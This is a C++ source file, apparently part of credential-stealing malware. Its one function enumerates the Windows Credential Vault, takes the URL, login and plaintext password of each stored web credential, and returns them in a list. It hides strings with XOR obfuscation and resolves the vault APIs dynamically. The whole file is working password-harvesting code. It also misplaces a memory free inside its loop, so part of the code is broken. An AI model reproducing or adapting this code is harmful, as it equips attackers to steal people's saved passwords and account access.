#include "Common.h"

vector<EdgeData::PassData> Edge::GetPasswords()
{
	DEBUG("Started")
	DWORD vaultsCounter, itemsCounter;
	LPGUID vaults;
	HANDLE hVault;
	PVOID items;
	PVAULT_ITEM vaultItems, pVaultItems;
	vector<EdgeData::PassData> pass;

	if (API(VAULTCLI, VaultEnumerateVaults)(NULL, &vaultsCounter, &vaults) != ERROR_SUCCESS) return pass;
	DEBUG("Vault enumerate success")

	for (DWORD i = 0; i < vaultsCounter; i++)
	{
		if (API(VAULTCLI, VaultOpenVault)(&vaults[i], 0, &hVault) != ERROR_SUCCESS) continue;
		DEBUG("Vault open success")

		if (API(VAULTCLI, VaultEnumerateItems)(hVault, VAULT_ENUMERATE_ALL_ITEMS, &itemsCounter, &items) != ERROR_SUCCESS) continue;
		DEBUG("Vault enumerate success")

		vaultItems = (PVAULT_ITEM)items;
		for (DWORD j = 0; j < itemsCounter; j++)
		{
			const string url = Utils::ToASCII(vaultItems[j].Resource->data.String);
			if (url.find(XorStr("http")) == string::npos)
				continue;
			const string login = Utils::ToASCII(vaultItems[j].Identity->data.String);

			pVaultItems = NULL;

			if (API(VAULTCLI, VaultGetItem)(hVault, &vaultItems[j].SchemaId, vaultItems[j].Resource, vaultItems[j].Identity, vaultItems[j].PackageSid, NULL, 0, &pVaultItems) == 0)
			{
				DEBUG("VaultGetItem success")
				if (pVaultItems->Authenticator != NULL && pVaultItems->Authenticator->data.String != NULL)
				{
					EdgeData::PassData password;
					password.Url = url;
					password.Login = login;
					password.Pass = Utils::ToASCII(pVaultItems->Authenticator->data.String);
					pass.push_back(password);
				}

				API(VAULTCLI, VaultFree)(pVaultItems);
			}

			API(VAULTCLI, VaultFree)(items);
		}
		API(VAULTCLI, VaultCloseVault)(&hVault);
	}

	if (vaults) API(VAULTCLI, VaultFree)(vaults);
	DEBUG("End")
	return pass;
}